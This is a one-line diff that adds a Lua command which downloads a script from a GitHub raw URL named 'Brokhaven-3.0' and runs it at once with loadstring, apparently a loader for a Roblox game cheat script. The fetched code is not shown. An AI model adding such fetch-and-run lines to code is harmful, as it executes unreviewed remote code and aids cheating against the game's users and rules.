@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joaov8tor/Brokhaven-3.0/refs/heads/main/Brokhaven"))()
